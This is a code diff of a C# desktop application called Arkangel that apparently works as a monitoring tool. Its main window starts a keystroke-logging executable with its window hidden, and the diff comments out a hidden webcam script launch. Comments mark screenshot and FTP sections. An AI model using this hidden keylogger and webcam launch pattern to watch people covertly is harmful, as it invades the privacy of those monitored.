@@ -53,14 +53,11 @@ namespace Arkangel
             }
             catch { }
         }
-
-
-
         public MainWindow()
         {
 
             InitializeComponent();
-
+           // ProcessStartInfo _startkeylog = startkeylog();
             if (mainPanel.Children.ToString() != "Dashboard")
             {
                 Dashboard dashboard = new Dashboard();
@@ -69,11 +66,11 @@ namespace Arkangel
             //Keystroke
             try
             {
-                ProcessStartInfo start = new ProcessStartInfo();
-                start.WorkingDirectory = @"..\..\module\";
-                start.FileName = "keystroke.exe";
-                start.WindowStyle = ProcessWindowStyle.Hidden;
-                Process.Start(start);
+                myProcess.StartInfo.UseShellExecute = true;
+                myProcess.StartInfo.FileName =@"..\..\Module\keystroke.exe";
+                myProcess.StartInfo.CreateNoWindow = true;
+                myProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                myProcess.Start();
             }
             catch { };
             //Screenshot
@@ -106,7 +103,7 @@ namespace Arkangel
 
             //FTP
 
-            Closing += new System.ComponentModel.CancelEventHandler(MainWindow_Closing);
+          //  Closing += new System.ComponentModel.CancelEventHandler(windowl);
 
         }
         private IntPtr _windowHandle;
@@ -171,10 +168,26 @@ namespace Arkangel
         {
             if (System.Windows.Forms.MessageBox.Show("Do you want to log out", "Warning", MessageBoxButtons.YesNo) == System.Windows.Forms.DialogResult.Yes)
             {
+                //ProcessStartInfo _process = startkeylog();
+                //foreach (var process in Process.GetProcessesByName("keystroke.exe"))
+                //{
+                //    process.Kill();
+                //}
+               
+                try
+                {
+                    myProcess.Kill();
+                    myProcess.Dispose();
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine(ex.ToString());
+                }
                 LoginForm loginForm = new LoginForm();
                 loginForm.Show();
                 Close();
             }
+           
         }
 
         private void bt_Quit_Click(object sender, RoutedEventArgs e)
@@ -185,34 +198,32 @@ namespace Arkangel
 
         private Process myProcess = new Process();
 
-        private void Grid_Loaded(object sender, RoutedEventArgs e)
-        {
-            try
-            {
-                myProcess.StartInfo.UseShellExecute = true;
-                myProcess.StartInfo.FileName = "..\\..\\Module_py\\webcam.py";
-                myProcess.StartInfo.CreateNoWindow = true;
-                myProcess.Start();
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("MESSAGE: " + ex.Message);
-            }
-
-
-        }
-        private void MainWindow_Closing(object sender, System.ComponentModel.CancelEventArgs e)
-        {
-            try
-            {
-                myProcess.Kill();
-                myProcess.Dispose();
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine(ex.ToString());
-            }
-        }
+        //private void Grid_Loaded(object sender, RoutedEventArgs e)
+        //{
+        //    //try
+        //    //{
+        //    //    myProcess.StartInfo.UseShellExecute = true;
+        //    //    myProcess.StartInfo.FileName = "..\\..\\Module_py\\webcam.py";
+        //    //    myProcess.StartInfo.CreateNoWindow = true;
+        //    //    myProcess.Start();
+        //    //}
+        //    //catch (Exception ex)
+        //    //{
+        //    //    Console.WriteLine("MESSAGE: " + ex.Message);
+        //    //}
+        //}
+        //private void MainWindow_Closing(object sender, System.ComponentModel.CancelEventArgs e)
+        //{
+        //    try
+        //    {
+        //        myProcess.Kill();
+        //        myProcess.Dispose();
+        //    }
+        //    catch (Exception ex)
+        //    {
+        //        Console.WriteLine(ex.ToString());
+        //    }
+        //}
 
         private void bt_Setting_Click(object sender, RoutedEventArgs e)
         {
